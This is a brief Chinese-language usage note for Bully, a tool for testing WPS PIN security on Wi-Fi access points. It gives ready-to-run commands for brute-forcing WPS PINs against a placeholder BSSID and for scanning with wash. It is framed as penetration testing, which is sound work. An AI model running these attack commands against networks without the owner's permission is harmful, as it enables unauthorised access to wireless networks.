# Bully 使用

Bully 用于 WPS PIN 安全测试，适合与 Reaver 交叉验证。

## 常用命令

```bash
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF
```

```bash
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6
```

```bash
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 3
```

```bash
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345670
```

```bash
sudo wash -i wlan0mon
```

如果 AP 启用 WPS 锁定，继续测试意义不大，记录锁定行为即可。
